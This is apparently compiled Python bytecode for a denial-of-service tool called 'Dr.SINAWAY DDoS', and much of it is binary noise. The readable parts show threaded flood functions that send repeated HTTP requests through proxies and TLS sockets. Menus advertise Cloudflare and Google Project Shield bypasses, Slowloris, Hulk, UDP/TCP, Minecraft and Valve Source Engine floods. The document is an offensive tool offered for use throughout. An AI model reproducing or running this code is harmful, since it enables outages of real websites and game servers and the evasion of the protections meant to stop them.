�	�� �"�"�A��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��K�K���c�%��(�m�m�S��q��]�]�C�C�C��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I���� �)�+�+��
�
�
�
�
�
s&   �DL6 �-A,L �L6 �L2�0L6 �6Mc                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �	LaunchSKYr�   r  s       r   �	attackSKYr�  G  sV   � ��3�w�<�<� � � F� F����	��e��=�=�=�C�C�E�E�E�E�F� Fr    c                 �  � t          �   �          t          dd�  �        �                    �   �         �                    d�  �        }t	          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t	          j        t          �  �        }t	          j        t          �  �        }|| z   dz   t          | �  �        j        z   dz   }|dz  }||dz   z  }|dz  }|d	z  }|d
z  }|dz  }|dz  }|dz  }|dz  }t          j        �   �         |k     �r�	 t          j        �   �         }|�                    t!          t          | �  �        j        �  �        t          d�  �        f�  �         |�                    t          j        t!          |d         �  �        t          |d         �  �        �  �         t'          j        t&          j        �  �        }	|	�                    |t          | �  �        j        ��  �        }|�                    t           �                    |�  �        �  �         	 t3          d�  �        D ]\}
|�                    t           �                    |�  �        �  �         |�                    t           �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j        �   �         |k     ���d S d S )NrF  rH   rI   r:   r�   r�   r  r�   r  r  r  r  r  r�   r  r   r;   r�   r  )r3   r*   rL   rC   r|   r�   r  rc   r   r�   r�   r   rB   r�   r�   r�   r   r�   rI  r�   rJ  rK  r�   r�   r�   r\   r0   r~  s              r   r�  r�  K  s�  � ��N�N�N����$�$�)�)�+�+�1�1�$�7�7�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�(�(�8�C�=�=�+?�?�&�H�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	�� �"�"�A��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��K�K���c�%��(�m�m�S��q��]�]�C�C�C��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I���� �)�+�+��
�
�
�
�
�
s&   �;DK �A,J: �9K �:K�K �K.c                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �LaunchPXHULKr�   r  s       r   �attackPXHULKr�  n  �V   � ��3�w�<�<� � � I� I�����C��<�@�@�@�F�F�H�H�H�H�I� Ir    c                 �  � t          �   �          t          dd�  �        �                    �   �         �                    d�  �        }t	          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t	          j        t          �  �        }t	          j        t          �  �        }|| z   dz   t          t	          j        dd�  �        �  �        z   dz   t          t	          j        dd�  �        �  �        z   d	z   t          | �  �        j        z   d
z   }|dz  }||d
z   z  }|dz  }|dz  }|dz  }|dz  }|dz  }|dz  }|dz  }t          j        �   �         |k     �r�	 t          j        �   �         }|�                    t          t          | �  �        j        �  �        t          d�  �        f�  �         |�                    t          j        t          |d         �  �        t          |d         �  �        �  �         t)          j        t(          j        �  �        }	|	�                    |t          | �  �        j        ��  �        }|�                    t          �                    |�  �        �  �         	 t5          d�  �        D ]\}
|�                    t          �                    |�  �        �  �         |�                    t          �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j        �   �         |k     ���d S d S )NrF  rH   rI   r:   z?=r;   r�   rU   rG  r�   r  r�   r  r  r  r  r  r�   r  r   r�   r  )r3   r*   rL   rC   r|   r�   r  rc   r   r�   r�   r   r�   r   rB   r�   r�   r�   r�   rI  r�   rJ  rK  r�   r�   r�   r\   r0   r~  s              r   r�  r�  r  s�  � ��N�N�N����$�$�)�)�+�+�1�1�$�7�7�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�4�<��V�^�A�d�3�3�4�4�4�S�8��V�^�A�d�=S�=S�9T�9T�T�Ul�l�ow�x{�o|�o|�  pD�  D�  GM�  M�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	�� �"�"�A��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��K�K���c�%��(�m�m�S��q��]�]�C�C�C��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I���� �)�+�+��
�
�
�
�
�
s&   �DL" �A,L �L" �L�L" �"L:c                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �Launchbypassr�   r  s       r   �attackbypassr�  �  r�  r    c                 �T  � t          dd�  �        �                    �   �         �                    d�  �        }t          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t          j        t          �  �        }t          j        t          �  �        }|| z   dz   t          | �  �        j        z   dz   }|dz  }||dz   z  }|dz  }|d	z  }|d
z  }|dz  }|dz  }|dz  }|dz  }t          j        �   �         |k     �r�	 t          j        �   �         }|�                    t          j        t!          |d         �  �        t          |d         �  �        �  �         |�                    t$          j        t$          j        d�  �         |�                    t!          t          | �  �        j        �  �        t          d�  �        f�  �         t-          j        t,          j        �  �        }	|	�                    |t          | �  �        j        ��  �        }|�                    t           �                    |�  �        �  �         	 t9          d�  �        D ]\}
|�                    t           �                    |�  �        �  �         |�                    t           �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j        �   �         |k     ���d S d S )NrG   rH   rI   r:   rG  r�   r  r�   r  r  r  r  r  r�   r   r;   r  r�   r  )r*   rL   rC   r|   r�   r  rc   r   r�   r�   r   rB   r�   r�   r�   r�   r   r�   r�   r�   r�   r�   r�   rJ  rK  r�   r�   r�   r\   r0   )r2   r  r  r�   r  r�   r�   r�   r�   r�   rh   s              r   r�  r�  �  s�  � ���c�"�"�'�'�)�)�/�/��5�5�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�*�*�X�c�]�]�-A�A�F�J�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	�� �"�"�A��K�K��
�C��a��M�M�3�u�Q�x�=�=�A�A�A��L�L��*�F�,?��C�C�C��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I����! �)�+�+��
�
�
�
�
�
s&   �-D<K3 �*A,K �K3 �K/�-K3 �3Lc                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �LaunchSTELLARr�   r  s       r   �attackSTELLARr�  �  sV   � ��3�w�<�<� � � J� J�����S�%�L�A�A�A�G�G�I�I�I�I�J� Jr    c                 ��  � t          j         �   �         t          |�  �        z   }t          j        t          �  �        }t          j        t
          �  �        }|| z   dz   t          | �  �        j        z   dz   }|dz  }||dz   z  }|dz  }|dz  }|dz  }|dz  }|dz  }|d	z  }|d
z  }t          j         �   �         |k     �r�	 t          j        t          j	        t          j
        �  �        }|�                    t          t          | �  �        j        �  �        t          d�  �        f�  �         t          j        t          j        �  �        }|�                    |t          | �  �        j        ��  �        }|�                    t          �                    |�  �        �  �         	 t'          d�  �        D ]\}|�                    t          �                    |�  �        �  �         |�                    t          �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j         �   �         |k     ���d S d S )NrG  r�   r  r�   r  r  r  r  r  r�   r  r�   r  )rc   r   r|   r�   r�   r�   r   rB   r�   r�   r�   r�   r   r�   rJ  rK  r�   r�   r�   r\   r0   )	r2   r  r  r�   r�   r�   r�   r�   rk   s	            r   r�  r�  �  s  � ��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�*�*�X�c�]�]�-A�A�F�J�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	���f�n�f�.@�A�A�A��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I���� �)�+�+��
�
�
�
�
�
s&   �?C H) � A,H �H) �H%�#H) �)Ic                  �\   � t           dk    rt          d�  �         d S t          d�  �         d S )N�nt�cls�clear)r   r   rN   r    r   r�  r�  �  s)   � ��t�|�|��u�������w�����r    c                  �  � t          j        d�  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   d
z   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   d	z   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        d�  �         d S )N�Z                                                                                         
�!                                 u.     ╦ ╦╔═╗╦  ╔═╗             
u.     ╠═╣║╣ ║  ╠═╝             
u/     ╩ ╩╚═╝╩═╝╩                
�             �~           ══╦═════════════════════════════════╦══
��   ╔═════════╩═════════════════════════════════╩═════════╗
�   ║ [38;2;255;20;147m• �	layer7   �|�( Show Layer7 Methods                    �   ║
�	layer4   �( Show Layer4 Methods                    �	tools    �( Show tools                             �	credit   �( Show credit                            �	exit     �( Exit DrSINAWAY DDoS                    ��   ╠═════════════════════════════════════════════════════╣
�	THANK    z( Thanks for using Dr.SINAWAY.           �   YOU♥     �( Plz star project :)                    �	github   �( github.com/drsinaway                   ��   ╚═════════════════════════════════════════════════════╝
rI   )r	   r   r
   �LIGHTWHITE_EXrs   rN   r    r   �helpr�  �  s  � �
�L�n�o�o�o�
�L�4�T�5G�G�K|�|�}�}�}�
�L�4�T�5E�E�J{�{�|�|�|�
�L�4�T�5E�E�J|�|�}�}�}�
�L���!1�1�  ?@�  @�  A�  A�  A�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q~�~�  @D�  @P�  P�  QT�  T�  UY�  Ug�  g�  hR�  R�  SW�  Sc�  c�  dk�  k�  l�  l�  l�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L������r    c                  �  � t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d	z   t          j        z   dz   t          j        z   d
z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        d�  �         d S )Nr�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  r�  z) Thanks for using Dr.SINAWAY.            r�  r�  r�  r�  r�  rI   �r	   r   r
   rs   r�  rN   r    r   �
infoattackr�  �  s�  � �
�L���!1�1�  ?@�  @�  A�  A�  A�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fQ�  Q�  RV�  Rb�  b�  cj�  j�  k�  k�  k�
�L���!1�1�>]�]�^b�^p�p�q~�~�  @D�  @P�  P�  QT�  T�  UY�  Ug�  g�  hR�  R�  SW�  Sc�  c�  dk�  k�  l�  l�  l�
�L���!1�1�>]�]�^b�^p�p�q|�|�  ~B�  ~N�  N�  OR�  R�  SW�  Se�  e�  fP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L������r    c                  �  � t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d	z   t          j        z   dz   t          j        z   d
z   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        d�  �         d S )Nr�  u�   ╔══════════════════════════════════════════════════╗
r�  zDeveloper    r�  z! Dr.SINAWAY                      r�  zUI Design    zversion -    z! V3.0                            u�   ╚══════════════════════════════════════════════════╝
rI   r�  rN   r    r   �creditr�    sR  � �
�L���!1�1�  ?_�  _�  `�  `�  `�
�L���!1�1�>]�]�^b�^p�p�  rA�  A�  BF�  BR�  R�  SV�  V�  W[�  Wi�  i�  jM�  M�  NR�  N^�  ^�  _f�  f�  g�  g�  g�
�L���!1�1�>]�]�^b�^p�p�  rA�  A�  BF�  BR�  R�  SV�  V�  W[�  Wi�  i�  jM�  M�  NR�  N^�  ^�  _f�  f�  g�  g�  g�
�L���!1�1�>]�]�^b�^p�p�  rA�  A�  BF�  BR�  R�  SV�  V�  W[�  Wi�  i�  jM�  M�  NR�  N^�  ^�  _f�  f�  g�  g�  g�
�L���!1�1�  ?_�  _�  `�  `�  `�
�L������r    c                  �
  � t          �   �          t          j        d�  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   d	z   �  �         t          j        dt          j        z   d
z   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   d z   t          j        z   d!z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d"z   t          j        z   dz   t          j        z   d#z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d$z   t          j        z   dz   t          j        z   d%z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d&z   t          j        z   dz   t          j        z   d'z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d(z   t          j        z   dz   t          j        z   d)z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   d*z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d+z   t          j        z   dz   t          j        z   d,z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d-z   t          j        z   dz   t          j        z   d.z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d/z   t          j        z   dz   t          j        z   d0z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d1z   t          j        z   dz   t          j        z   d2z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d3z   t          j        z   dz   t          j        z   d4z   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   d5z   t          j        z   dz   t          j        z   d6z   t          j        z   dz   �  �         t          j        dt          j        z   d7z   �  �         t          j        d8�  �         d S )9Nr�  r�  u?   ╦  ╔═╗╦ ╦╔═╗╦═╗ ══╗             
u=   ║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             
u;   ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              
z                z)                  DDoS Tool Layer7      
r�  u�           ════╦════════════════════════════════════╦══
u�   ╔═══════════╩════════════════════════════════════╩═════════╗
u   ║ [38;2;255;20;147m•   zspoof z   |z+ STRONG Bypass with spoof Xforward         r�  zcfb   z+ Bypass CF Attack                          zpxcfb z+ Bypass CF Attack With Proxy               zcfpro z+ Bypass CF UAM, CAPTCHA, BFM (request)     zcfsoc z+ Bypass CF UAM, CAPTCHA, BFM (socket)      �bypassz+ Bypass Google Project Shield, Vshield,    zsky   z+ DDoS Guard Free, CF NoSec                 �stellarz  |z+ HTTPS Sky method without proxies          zstress  z |z+ DDos stress HEX method                    zget   z+ Get Request Attack                        zpost  z+ Post Request Attack                       zhead  z+ Head Request Attack                       zhttp2 z+ HTTP 2.0 Request Attack                   z+ HTTP Spoof Socket Attack                  zsoc   z+ Socket Attack                             zhulk  z+ Hulk DoS tool                             �pxhulkz+ Proxy Hulk DoS tool                       zpxraw z+ Proxy Request Attack                      zpxsoc z+ Proxy Socket Attack                       �pxslowz+ Proxy Slowloris attack                    u�   ╚══════════════════════════════════════════════════════════╝
rI   �r�  r	   r   r
   r�  rs   �LIGHTGREEN_EXrN   r    r   �layer7r�    sY  � �	�G�G�G�
�L�n�o�o�o�
�L�4�T�5G�G�  LN�  N�  O�  O�  O�
�L�4�T�5E�E�  KK�  K�  L�  L�  L�
�L�4�T�5E�E�  KI�  I�  J�  J�  J�
�L�#�D�$6�6�Co�o�p�p�p�
�L���!1�1�  ?O�  O�  P�  P�  P�
�L���!1�1�  ?w�  w�  x�  x�  x�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s|�|�  ~B�  ~N�  N�  OT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s}�}�  C�  O�  O�  PT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�>_�_�`d�`r�r�s{�{�  }A�  }M�  M�  NT�  T�  UY�  Ug�  g�  hU�  U�  VZ�  Vf�  f�  gn�  n�  o�  o�  o�
�L���!1�1�  ?w�  w�  x�  x�  x�
�L������r    c                  �  � t          �   �          t          j        d�  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   d	z   �  �         t          j        dt          j        z   d
z   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        d�  �         d S )Nr�  �"                                  u=   ╦  ╔═╗╦ ╦╔═╗╦═╗ ╦ ╦             
u?   ║  ╠═╣╚╦╝║╣ ╠╦╝ ╚═╣             
u<   ╩═╝╩ ╩ ╩ ╚═╝╩╚═   ╩              
z                 z)                  DDoS Tool Layer4      
r�  r�  r�  r�  zudp   r�  z+ UDP Attack                                r�  ztcp   zmine  z+ Minecraft Dos attack                      zvse   z+ Send Valve Source Engine Protocol         r�  rI   r�  rN   r    r   �layer4r�  0  s�  � �	�G�G�G�
�L�n�o�o�o�
�L�5�d�6H�H�  MM�  M�  N�  N�  N�
�L�5�d�6F�F�  LN�  N�  O�  O�  O�
�L�5�d�6F�F�  LK�  K�  L�  L�  L�
�L�$�T�%7�7�Eq�q�r�r�r�
�L���!1�1�  ?@�  @�  A�  A�  A�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L���!1�1�>]�]�^b�^p�p�qy�y�z~�  {K�  K�  LO�  O�  PT�  Pb�  b�  cP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�qy�y�z~�  {K�  K�  LO�  O�  PT�  Pb�  b�  cP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�qy�y�z~�  {K�  K�  LO�  O�  PT�  Pb�  b�  cP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�>]�]�^b�^p�p�qy�y�z~�  {K�  K�  LO�  O�  PT�  Pb�  b�  cP�  P�  QU�  Qa�  a�  bi�  i�  j�  j�  j�
�L���!1�1�  ?h�  h�  i�  i�  i�
�L������r    c                  ��  � t          �   �          t          j        d�  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        dt          j        z   d	z   �  �         t          j        dt          j        z   d
z   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   t          j        z   dz   �  �         t          j        dt          j        z   dz   �  �         t          j        d�  �         d S )Nr�  r�  u7   ╔╦╗╔═╗╔═╗╦  ╔═╗             
u/    ║ ║ ║║ ║║  ╚═╗             
u7    ╩ ╚═╝╚═╝╩═╝╚═╝             
z                  z!                     Tools      
r�  r�  r�  r�  zgeoip r�  z Geo IP Address Lookupu                        ║
zdns   z Classic DNS Lookup   �subnetz Subnet IP Address Lookup   u                  ║
r�  rI   r�  rN   r    r   �toolsr�  @  s  � �	�G�G�G�
�L�n�o�o�o�
�L�5�d�6H�H�  MG�  G�  H�  H�  H�
�L�5�d�6F�F�K}�}�~�~�~�
�L�5�d�6F�F�  LF�  F�  G�  G�  G�
�L�%�d�&8�8�Fj�j�k�k�k�
�L���!1�1�  ?@�  @�  A�  A�  A�
